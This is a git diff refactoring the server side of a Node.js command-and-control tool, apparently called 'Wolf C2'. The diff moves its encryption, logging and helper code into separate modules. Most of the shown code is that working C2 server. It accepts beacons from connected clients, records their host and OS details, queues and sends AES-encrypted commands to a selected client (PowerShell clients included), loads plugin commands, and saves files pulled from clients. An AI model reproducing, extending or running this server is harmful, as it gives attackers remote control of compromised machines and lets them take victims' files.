@@ -19,17 +19,18 @@
  *    LICENSE: GPL-3.0
  */
 //  ------------------------------------- VARIABLES -------------------------------------
-const { createServer } = require('net');
-const { pbkdf2, randomBytes, createHash, createCipheriv, createHmac, createDecipheriv, timingSafeEqual } = require('crypto');
-const { promisify } = require('util');
-const { networkInterfaces } = require("os");
-const { mkdir, readdir, writeFile } = require('fs');
-const { join } = require('path');
-const { createInterface } = require('readline');
-const { existsSync, createWriteStream } = require('fs');
+const { createServer } = require('node:net');
+const { promisify } = require('node:util');
+
+const { mkdir, readdir, writeFile, existsSync, createWriteStream } = require('node:fs');
+const { join } = require('node:path');
+const { createInterface } = require('node:readline');
+
+const { encryptData, decryptData, getSessionId } = require('./utils/encdec');
+const { getLocalIpAddress, getUptime } = require('./utils/helpers');
+const { log, logInfo, logError, logSuccess, createLogStream } = require('./utils/logging');
+
 // promises
-const pbkdf2_promise = promisify(pbkdf2);
-const randomBytes_promise = promisify(randomBytes);
 const mkdir_promise = promisify(mkdir);
 const readdir_promise = promisify(readdir);
 const writeFile_promise = promisify(writeFile);
@@ -38,10 +39,9 @@ const _VERSION = '0.2.0';
 const CHUNK_SIZE = 1024;
 const PORT = 54678;
 const LOGGING = true;
+
 const DOWNLOADS_FOLDER = join(__dirname, 'downloads');
 const PLUGINS_FOLDER = join(__dirname, 'plugins');
-const MAX_LOG_LINES = 20000;
-const SUPPORTED_CIPHERS = ['aes-256-cbc', 'aes-256-gcm'];
 
 const activeClients = new Map();
 const queuedCommands = new Map();
@@ -50,198 +50,11 @@ const serverCommands = ['help', 'client', 'clients', 'exit', 'plugins', 'set', '
 const clientCommands = [];
 
 let rl = null; // console readline instance
-let startTime = Date.now(); // script start time
 let activeClientSessionID = null; // active client
 let server = null; // server sockets instance
-let logFileIndex = 1; // log file index
 let logStream = null; // log stream instance
-let currentLineCount = 0; // current log line count
+let startTime = Date.now(); // script start time
 
-//  ------------------------------------- LOGGING -------------------------------------
-
-// Create a writable stream for logging
-const createLogStream = (index) => {
-    if (LOGGING) {
-        const logFilePath = join('logs', `server_${index}.log`);
-        return createWriteStream(logFilePath, { flags: 'a' });
-    }
-    return null;
-};
-
-const log = (texts, colors = 97) => {
-    // Ensure texts and colors are arrays
-    texts = Array.isArray(texts) ? texts : [texts];
-    colors = Array.isArray(colors) ? colors : [colors];
-
-    // Check that the lengths of texts and colors match
-    if (texts.length !== colors.length) {
-        console.error("Error: The lengths of texts and colors should match.");
-        return;
-    }
-
-    if (LOGGING && logStream) {
-        const message = texts.join(' ');
-        const lineCount = message.split(/\r\n|\r|\n/).length;
-        
-        currentLineCount += lineCount;
-        if (currentLineCount >= MAX_LOG_LINES) {
-            logStream.end();
-            logFileIndex++;
-            logStream = createLogStream(logFileIndex);
-            currentLineCount = 0;
-        }
-
-        logStream.write(`${message}\n`);
-    }
-
-    // Format and log to console
-    const formattedText = texts.map((text, index) => `\x1b[${colors[index]}m${text}\x1b[0m`).join(' ');
-    console.log(formattedText);
-};
-
-const logError = (error) => {
-    log(error, 91); // Bright Red
-};
-const logInfo = (info) => {
-    log(info, 37); // White
-};
-const logSuccess = (success) => {
-    log(success, 92); // Bright Green
-};
-
-//  ------------------------------------- HELPER METHODS  -------------------------------------
-
-/**
- * Get the server local IP address
- * @returns 
- */
-const getLocalIpAddress = () => {
-    const interfaces = networkInterfaces();
-    let localIp;
-
-    // Iterate through the network interfaces
-    Object.keys(interfaces).forEach((ifaceName) => {
-        interfaces[ifaceName].forEach((iface) => {
-            // Skip over non-IPv4 and internal interfaces, and addresses starting with 172. and 127.
-            if (iface.family === 'IPv4' && !iface.internal && !iface.address.startsWith('172.') && !iface.address.startsWith('127.')) {
-                localIp = iface.address
-            }
-        });
-    });
-    return localIp || 'localhost';
-};
-
-/**
- * gets the client session ID
- * @returns 
- */
-const getSessionId = (ipAddress) => {
-    if (ipAddress === '::1') {
-        ipAddress = '127.0.0.1';
-    }
-    const sum = ipAddress.split('.').reduce((acc, val) => acc + parseInt(val), 0);
-    return createHash('sha256').update(ipAddress + '<>' + sum).digest('hex').slice(0, 32);
-};
-
-/**
- * PBKDF2 Encryption
- * @param {string} data 
- * @param {string} sharedKey 
- * @param {string} [cipher='aes-256-gcm'] 
- * @returns {Promise<string>}
- */
-const encryptData = async (data, sharedKey, cipher = 'aes-256-gcm') => {
-    if (typeof data !== 'string' || typeof sharedKey !== 'string') {
-        throw new TypeError('Data and shared key must be strings');
-    }
-    if (!SUPPORTED_CIPHERS.includes(cipher)) {
-        throw new TypeError(`Unsupported cipher. Supported ciphers are: ${SUPPORTED_CIPHERS.join(', ')}`);
-    }
-    try {
-        const salt = await randomBytes_promise(32);
-        const iv = await randomBytes_promise(cipher.endsWith('gcm') ? 12 : 16);
-        const key = await pbkdf2_promise(sharedKey, salt, 200000, 32, 'sha512');
-        const cipherIv = createCipheriv(cipher, key, iv);
-        let encryptedData = cipherIv.update(data, 'utf8', 'base64');
-        encryptedData += cipherIv.final('base64');
-        let authTag;
-        if (cipher.endsWith('gcm')) {
-            authTag = cipherIv.getAuthTag();
-        } else {
-            const hmac = createHmac('sha256', key);
-            hmac.update(Buffer.from(encryptedData, 'base64'));
-            authTag = hmac.digest();
-        }
-        return `${salt.toString('base64')}:${iv.toString('base64')}:${authTag.toString('base64')}:${encryptedData}`;
-    } catch (err) {
-        if (err instanceof TypeError) {
-            throw err;
-        }
-        throw new Error(`Encryption failed: ${err.message}`);
-    }
-};
-
-/**
- * PBKDF2 Decryption
- * @param {string} encrypted 
- * @param {string} sharedKey 
- * @returns {Promise<string>}
- */
-const decryptData = async (encrypted, sharedKey) => {
-    if (typeof encrypted !== 'string' || typeof sharedKey !== 'string') {
-        throw new TypeError('Encrypted data and shared key must be strings');
-    }
-    try {
-        const [salt, iv, authTag, encryptedData] = encrypted.split(':');
-        const cipher = Buffer.from(iv, 'base64').length === 12 ? 'aes-256-gcm' : 'aes-256-cbc';
-        const key = await pbkdf2_promise(sharedKey, Buffer.from(salt, 'base64'), 200000, 32, 'sha512');
-        const decipher = createDecipheriv(cipher, key, Buffer.from(iv, 'base64'));
-        if (cipher.endsWith('gcm')) {
-            decipher.setAuthTag(Buffer.from(authTag, 'base64'));
-        } else {
-            const hmac = createHmac('sha256', key);
-            hmac.update(Buffer.from(encryptedData, 'base64'));
-            const computedAuthTag = hmac.digest();
-            if (!timingSafeEqual(Buffer.from(authTag, 'base64'), computedAuthTag)) {
-                throw new Error('Authentication failed. The data may have been tampered with.');
-            }
-        }
-        let decryptedData = decipher.update(encryptedData, 'base64', 'utf8');
-        decryptedData += decipher.final('utf8');
-        return decryptedData;
-    } catch (err) {
-        if (err instanceof TypeError) {
-            throw err;
-        }
-        throw new Error(`Decryption failed: ${err.message}`);
-    }
-};
-
-/**
- * Format the uptime to hours, minutes and seconds
- * @param {*} milliseconds 
- * @returns 
- */
-const formatTime = (milliseconds) => {
-    const totalSeconds = Math.floor(milliseconds / 1000);
-    const days = Math.floor(totalSeconds / 86400);
-    const hours = Math.floor((totalSeconds % 86400) / 3600);
-    const minutes = Math.floor((totalSeconds % 3600) / 60);
-    const seconds = totalSeconds % 60;
-    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
-};
-
-/**
- * Get the server uptime
- * @returns 
- */
-const getUptime = () => {
-    const currentTime = Date.now();
-    const uptimeMillis = currentTime - startTime;
-    return `Uptime: ${formatTime(uptimeMillis)}`;
-};
-
-//  ------------------------------------- Response Handlers -------------------------------------
 /**
  * Beacon handler
  * @param {*} response
@@ -249,7 +62,7 @@ const getUptime = () => {
  */
 const handleBeacon = (response, sessionId) => {
     const client = activeClients.get(sessionId);
-    logInfo(`\nReceived beacon from client: ${sessionId}`);
+    logInfo(`\nReceived beacon from client: ${sessionId}`, logStream);
     const date = new Date();
     const dateOptions = { year: 'numeric', month: 'long', day: 'numeric' };
     const timeOptions = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
@@ -279,9 +92,9 @@ const handleDownloadResponse = async (response) => {
         const fileName = response.download;
         const assembledFilePath = join(DOWNLOADS_FOLDER, fileName);
         await writeFile_promise(assembledFilePath, Buffer.from(response.data, 'base64'));
-        logSuccess(`\nFile "${fileName}" downloaded successfully to ${DOWNLOADS_FOLDER}`);
+        logSuccess(`\nFile "${fileName}" downloaded successfully to ${DOWNLOADS_FOLDER}`, logStream);
     } catch (error) {
-        logError(`Error handling download response: ${error.message}`);
+        logError(`Error handling download response: ${error.message}`, logStream);
     }
 };
 
@@ -292,7 +105,7 @@ const handleDownloadResponse = async (response) => {
  */
 const handleResponse = (response) => {
     if (!response) {
-        logError("Error: invalid response.");
+        logError("Error: invalid response.", logStream);
         return;
     }
     // deconstruct the response response if exists;
@@ -304,20 +117,20 @@ const handleResponse = (response) => {
         if (data.type === "Buffer") {
             // handle buffer response
             const response = Buffer.from(data.data).toString('utf8').trim();
-            log(response);
+            log(response, logStream);
             return;
         } else {
             if (typeof data !== 'string') {
                 data = JSON.stringify(data);
             }
-            log(data.toString('utf8').trim());
+            log(data.toString('utf8').trim(), logStream);
         }
         return;
     } else if (response.message) {
-        logInfo(response.message);
+        logInfo(response.message, logStream);
         return;
     } else if (response.error) {
-        logError(response.error);
+        logError(response.error, logStream);
         return;
     }
 };
@@ -333,17 +146,17 @@ const showClient = () => {
     if (!client) {
         throw new Error(`Invalid session ID: ${activeClientSessionID}`);
     }
-    log("\nClient Details:", 93);
-    log(["Last Seen:\t\t", client.lastSeen], [96, 97]);
-    log(["Active:\t\t\t", client.active], [96, 97]);
-    log(["Session ID:\t\t", client.sessionId], [96, 97]);
-    log(["Hostname:\t\t", client.hostname], [96, 97]);
-    log(["IP Address:\t\t", client.address], [96, 97]);
-    log(["Type:\t\t\t", client.type], [96, 97]);
-    log(["Client Ver:\t\t", client.version], [96, 97]);
-    log(["Architecture:\t\t", client.arch], [96, 97]);
-    log(["Platform:\t\t", client.platform], [96, 97]);
-    log(["OS Ver:\t\t\t", client.osver, "\n"], [96, 97, 97]);
+    log("\nClient Details:", 93, logStream);
+    log(["Last Seen:\t\t", client.lastSeen], [96, 97], logStream);
+    log(["Active:\t\t\t", client.active], [96, 97], logStream);
+    log(["Session ID:\t\t", client.sessionId], [96, 97], logStream);
+    log(["Hostname:\t\t", client.hostname], [96, 97], logStream);
+    log(["IP Address:\t\t", client.address], [96, 97], logStream);
+    log(["Type:\t\t\t", client.type], [96, 97], logStream);
+    log(["Client Ver:\t\t", client.version], [96, 97], logStream);
+    log(["Architecture:\t\t", client.arch], [96, 97], logStream);
+    log(["Platform:\t\t", client.platform], [96, 97], logStream);
+    log(["OS Ver:\t\t\t", client.osver, "\n"], [96, 97, 97], logStream);
 };
 
 /**
@@ -353,15 +166,15 @@ const showClient = () => {
 const setClientActive = (sessionId) => {
     if (!sessionId) {
         activeClientSessionID = null;
-        log('The active session ID has been cleared.');
+        log('The active session ID has been cleared.', logStream);
         return;
     }
     let clientExists = activeClients.get(sessionId);
     if (sessionId && clientExists && sessionId.length === 32) {
         activeClientSessionID = sessionId;
-        log(`${activeClientSessionID} is now the active session.`);
+        log(`${activeClientSessionID} is now the active session.`, logStream);
     } else {
-        logError('Invalid session ID.');
+        logError('Invalid session ID.', logStream);
     }
 };
 
@@ -410,7 +223,7 @@ const handleServerCommand = async (command, properties) => {
                         await rl.write("\u001b[0J\u001b[1J\u001b[2J\u001b[0;0H\u001b[0;0W", { ctrl: true, name: 'l'});
                         break;
                     case 'uptime':
-                        log(getUptime());
+                        log(getUptime(startTime), logStream);
                         break;
                     case 'set':
                         setClientActive(properties[0]);
@@ -431,13 +244,13 @@ const handleServerCommand = async (command, properties) => {
                         closeServer();
                         break;
                     default:
-                        logInfo('Invalid command. Type "help" to see available commands.');
+                        logInfo('Invalid command. Type "help" to see available commands.', logStream);
                 }
             }
         }
         await rl.prompt();
     } catch (error) {
-        logError(`Exception: ${error.message}`);
+        logError(`Exception: ${error.message}`, logStream);
     }
 };
 
@@ -460,7 +273,7 @@ const sendCommandToClient = async (client, command, args) => {
     } else {
         const queuedCommandsForSession = queuedCommands.get(client.sessionId) || [];
         queuedCommandsForSession.push({ command, args });
-        logInfo(`Queued command for client ${client.sessionId}. Command: ${command} ${args}`);
+        logInfo(`Queued command for client ${client.sessionId}. Command: ${command} ${args}`, logStream);
         queuedCommands.set(client.sessionId, queuedCommandsForSession);
     }
 };
@@ -473,7 +286,11 @@ const sendCommandToClient = async (client, command, args) => {
 const executeClientCommand = async (client, command) => {
     const socket = client.socket;
     const sessionId = client.sessionId;
-    const payload = await encryptData(command, sessionId);
+    let cipher = 'aes-256-gcm';
+    if (client.type === 'ps') {
+        cipher = 'aes-256-cbc';
+    }
+    const payload = await encryptData(command, sessionId, cipher);
     if (payload) {
         return new Promise((resolve) => {
             if (socket.write(payload) === true) {
@@ -498,7 +315,7 @@ const executeQueuedCommands = async (client) => {
     if (commands) {
         commands.forEach(async ({ command, args }) => {
             await executeClientCommand(client, `${command} ${args.join(' ')}`);
-            logInfo(`Queued client command executed: ${command} ${args.join(' ')}`);
+            logInfo(`Queued client command executed: ${command} ${args.join(' ')}`, logStream);
         });
         queuedCommands.delete(client.sessionId);
     }
@@ -511,23 +328,23 @@ const executeQueuedCommands = async (client) => {
 const showActiveClients = () => {
     if (activeClients.size === 0) {
         getHowel();
-        logInfo('No active clients.');
+        logInfo('No active clients.', logStream);
         return;
     }
     const active = Array.from(activeClients.values()).filter(client => client.active).length;
-    logSuccess(`\nClient Sessions (${activeClients.size} Total / ${active} Active):`);
+    logSuccess(`\nClient Sessions (${activeClients.size} Total / ${active} Active):`, logStream);
     const colWidths = [36, 15, 20, 10, 10, 10, 10];
     const totalWidth = colWidths.reduce((sum, width) => sum + width, 0) + colWidths.length + 1;
     const pad = (str, len) => str ? str.padEnd(len) : "".padEnd(10);
-    logInfo('┌' + '─'.repeat(totalWidth - 2) + '┐');
+    logInfo('┌' + '─'.repeat(totalWidth - 2) + '┐', logStream);
     logInfo('│' + pad('SessionID', colWidths[0]) + '│' +
                      pad('ClientIP', colWidths[1]) + '│' +
                      pad('Updated', colWidths[2]) + '│' +
                      pad('Online', colWidths[3]) + '│' +
                      pad('Active', colWidths[4]) + '│' +
                      pad('Ver', colWidths[5]) + '│' +
-                     pad('Type', colWidths[6]) + '│');
-    logInfo('├' + colWidths.map(w => '─'.repeat(w)).join('┼') + '┤');
+                     pad('Type', colWidths[6]) + '│', logStream);
+    logInfo('├' + colWidths.map(w => '─'.repeat(w)).join('┼') + '┤', logStream);
     for (const [sessionId, client] of activeClients) {
         const datetime = new Date(client.lastSeen);
         const lastSeen = datetime.toLocaleDateString('en-US', {
@@ -542,9 +359,9 @@ const showActiveClients = () => {
                          pad(client.active ? 'Yes' : 'No', colWidths[3]) + '│' +
                          pad(client.sessionId === activeClientSessionID ? 'Yes' : 'No', colWidths[4]) + '│' +
                          pad(client.version, colWidths[5]) + '│' +
-                         pad(client.type, colWidths[6]) + '│');
+                         pad(client.type, colWidths[6]) + '│', logStream);
     }
-    logInfo('└' + colWidths.map(w => '─'.repeat(w)).join('┴') + '┘');
+    logInfo('└' + colWidths.map(w => '─'.repeat(w)).join('┴') + '┘', logStream);
 };
 
 /**
@@ -571,11 +388,11 @@ const registerPlugin = (plugin) => {
                 // Register the command globally
                 global[name] = handler;
             } else {
-                logError(`Plugin: "${plugin.name}" is already registered.`);
+                logError(`Plugin: "${plugin.name}" is already registered.`, logStream);
             }
         });
     }
-    logInfo(`Plugin: "${plugin.name} - ${plugin.module.description}" has been registered.`);
+    logInfo(`Plugin: "${plugin.name} - ${plugin.module.description}" has been registered.`, logStream);
 
     // Add the plugin to the loaded plugins map
     loadedPlugins.set(plugin.name, plugin.module);
@@ -592,12 +409,12 @@ const loadAndRegisterPlugins = async () => {
             const pluginPath = join(PLUGINS_FOLDER, pluginName);
             const pluginModule = require(pluginPath);
             if (!pluginModule || typeof pluginModule !== 'object') {
-                logError(`Invalid plugin module in file "${pluginName}". Skipping...`);
+                logError(`Invalid plugin module in file "${pluginName}". Skipping...`, logStream);
                 return;
             }
             // Check if the plugin module exports the 'commands' object
             if (!pluginModule.commands) {
-                logError(`Plugin "${pluginName}" does not have valid commands defined.`);
+                logError(`Plugin "${pluginName}" does not have valid commands defined.`, logStream);
                 return;
             }
             if (file.isFile()) {
@@ -605,7 +422,7 @@ const loadAndRegisterPlugins = async () => {
             }
         }));
     } catch (err) {
-        logError('Error loading plugins:', err.message);
+        logError(`Error loading plugins: ${err.message}`, logStream);
     }
 };
 
@@ -623,7 +440,7 @@ const getHowel = () => {
 ⠀⠀⠀⢀⣴⠫⠤⣶⣿⢀⡏⠀⠀⠘⢸⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀
 ⠐⠿⢿⣿⣤⣴⣿⣣⢾⡄⠀⠀⠀⠀⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀
 ⠀⠀⠀⣨⣟⡍⠉⠚⠹⣇⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⠀⠀⢀⡀⣾⡇⠀⠀
-⠀⠀⠀⢠⠟⣹⣧⠃⠀⠀⢿⢻⡀⢄⠀⠀⠀⠀⠐⣦⡀⣸⣆⠀⣾⣧⣯⢻`);
+⠀⠀⠀⢠⠟⣹⣧⠃⠀⠀⢿⢻⡀⢄⠀⠀⠀⠀⠐⣦⡀⣸⣆⠀⣾⣧⣯⢻`, undefined, logStream);
 };
 
 const getWolfText = () => {
@@ -632,7 +449,7 @@ const getWolfText = () => {
 ██║ █╗ ██║██║██╔██║██║⠀⡇⢹⢿⡀█████╗      ██║      █████╔╝
 ██║███╗██║████╔╝██║██║⠀⠀⠼⠇⠁██╔══╝      ██║     ██╔═══╝ 
 ╚███╔███╔╝╚██████╔╝███████╗██║         ╚██████╗███████╗
- ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝          ╚═════╝╚══════╝`);
+ ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝          ╚═════╝╚══════╝`, undefined, logStream);
 };
 
 /**
@@ -640,20 +457,20 @@ const getWolfText = () => {
  */
 const getStartup = () => {
     getWolfText();
-    log([`Ver. ${_VERSION}`, ' | ',`Listening on: ${getLocalIpAddress()}:${PORT}`, ' | ', `${getUptime()}`], [94, 97, 93, 97, 93]);
+    log([`Ver. ${_VERSION}`, ' | ',`Listening on: ${getLocalIpAddress()}:${PORT}`, ' | ', `${getUptime(startTime)}`], [94, 97, 93, 97, 93], logStream);
 };
 
 /**
  * Displays the active plugins
  */
 const displayActivePlugins = () => {
-    log("\nACTIVE PLUGINS:", 93);
+    log("\nACTIVE PLUGINS:", 93, logStream);
     Array.from(loadedPlugins).forEach(plugin => {
         const [ name, module ] = plugin;
-        log(["Type:", `\t\t${module.type} plugin`], [96, 97]);
-        log(["Name:", `\t\t${name}`], [96, 97]);
-        log(["Description:", `\t${module.description}`], [96, 97]);
-        log(["Commands:", `\t${Object.keys(module.commands).join(', ')}\n`], [96, 97]);
+        log(["Type:", `\t\t${module.type} plugin`], [96, 97], logStream);
+        log(["Name:", `\t\t${name}`], [96, 97], logStream);
+        log(["Description:", `\t${module.description}`], [96, 97], logStream);
+        log(["Commands:", `\t${Object.keys(module.commands).join(', ')}\n`], [96, 97], logStream);
     });
 };
 
@@ -661,17 +478,17 @@ const displayActivePlugins = () => {
  * Displays the server commands
  */
 const displayCommandOptions = () => {
-    log("\nSERVER COMMANDS:", 93);
-    log(["help\t\t", "Display available commands."], [96, 97]);
-    log(["plugins \t", "List all active plugins."], [96, 97]);
-    log(["clients \t", "List all active clients."], [96, 97]);
-    log(["uptime\t\t", "Display server uptime."], [96, 97]);
-    log(["set\t\t", "Sets the client session to make active."], [96, 97]);
-    log(["clear\t\t", "Clear the console."], [96, 97]);
-    log(["exit\t\t", "Exit the server."], [96, 97]);
-    log("\nPLUGINS:", 93);
+    log("\nSERVER COMMANDS:", 93, logStream);
+    log(["help\t\t", "Display available commands."], [96, 97], logStream);
+    log(["plugins \t", "List all active plugins."], [96, 97], logStream);
+    log(["clients \t", "List all active clients."], [96, 97], logStream);
+    log(["uptime\t\t", "Display server uptime."], [96, 97], logStream);
+    log(["set\t\t", "Sets the client session to make active."], [96, 97], logStream);
+    log(["clear\t\t", "Clear the console."], [96, 97], logStream);
+    log(["exit\t\t", "Exit the server."], [96, 97], logStream);
+    log("\nPLUGINS:", 93, logStream);
     for (const [pluginName, pluginModule] of loadedPlugins.entries()) {
-        log(`${pluginName}: ${pluginModule.description}`, 93);
+        log(`${pluginName}: ${pluginModule.description}`, 93, logStream);
         if (pluginModule.commands) {
             let cnt = 0;
             Object.keys(pluginModule.commands).forEach((command) => {
@@ -687,7 +504,7 @@ const displayCommandOptions = () => {
                 if (cnt === Object.keys(pluginModule.commands).length) {
                     format2 = "\n";
                 }
-                log([`${command}${format}`, `${pluginModule.commands[command].description}${format2}`], [96, 97]);
+                log([`${command}${format}`, `${pluginModule.commands[command].description}${format2}`], [96, 97], logStream);
             });
         }
     }
@@ -698,13 +515,13 @@ const sendClientCommand = async (command, args) => {
     if (sessionId) {
         const client = activeClients.get(sessionId);
         if (!client) {
-            logError(`Invalid client session ID or client not found.`);
+            logError(`Invalid client session ID or client not found.`, logStream);
             return;
         }
         // Send command to client and wait for response
         await sendCommandToClient(client, command, args);
     } else {
-        logInfo(`You must first set an active client sessionID.`);
+        logInfo(`You must first set an active client sessionID.`, logStream);
     }
 };
 
@@ -712,20 +529,21 @@ const sendClientCommand = async (command, args) => {
  * Closes the server connection
  */
 const closeServer = () => {
-    if (rl) {
-        rl.close();
-        logSuccess(`Console has been closed.`);
-    }
     for (const [sessionId, client] of activeClients) {
         client.socket.destroy();
-        logSuccess(`Client connection ${sessionId} has been closed.`);
+        logSuccess(`Client connection ${sessionId} has been closed.`, logStream);
     }
-    // close server
+    activeClientSessionID = null;
     server.close(() => {
-        logInfo('\nServer connection closed');
+        logInfo('\nServer connection closed', logStream);
+        if (rl) {
+            rl.close();
+            logSuccess(`Console has been closed.`, logStream);
+        }
         if (logStream) {
             // stop log stream
             logStream.end();
+            logSuccess(`LogStream has been closed.`, logStream);
         }
         process.exit(0);
     });
@@ -756,12 +574,9 @@ const startInputListener = () => {
             // handle the command
             await handleServerCommand(command, args);
         } catch (error) {
-            logError(`Error: ${error.message}`);
+            logError(`Error: ${error.message}`, logStream);
             rl.prompt();
         }
-    }).on('close', () => {
-        logError('Input handler closed unexpectedly. Server is shutting down.');
-        closeServer();
     });
 };
 
@@ -821,24 +636,24 @@ server = createServer((socket) => {
                 } else if (response.download) {
                     await handleDownloadResponse(response, client.sessionId);
                 } else if (response.error) {
-                    logError(response.error);
+                    logError(response.error, logStream);
                 } else {
                     handleResponse(response);
                 }
             }
         } catch(err) {
-            logError(err.message);
+            logError(err.message, logStream);
         }
     });
     socket.on('end', () => {
-        logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`);
+        logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`, logStream);
         if (client) {
             client.lastSeen = new Date();
             client.active = false;
         }
     });
     socket.on('error', (err) => {
-        logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`);
+        logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`, logStream);
         if (client) {
             client.active = false;
         }
@@ -846,18 +661,12 @@ server = createServer((socket) => {
 });
 
 server.on('error', (err) => {
-    logError('\nServer threw an error:', err.message);
-    if (rl) {
-        rl.close();
-    }
-    if (logStream) {
-        logStream.end();
-    }
-    server.close();
+    logError(`\nServer threw an error: ${err.message}`, logStream);
+    closeServer();
 });
 
 server.listen(PORT, async () => {
-    logStream = createLogStream(logFileIndex);
+    logStream = await createLogStream(LOGGING);
     getHowel();
     getStartup();
     await loadAndRegisterPlugins();
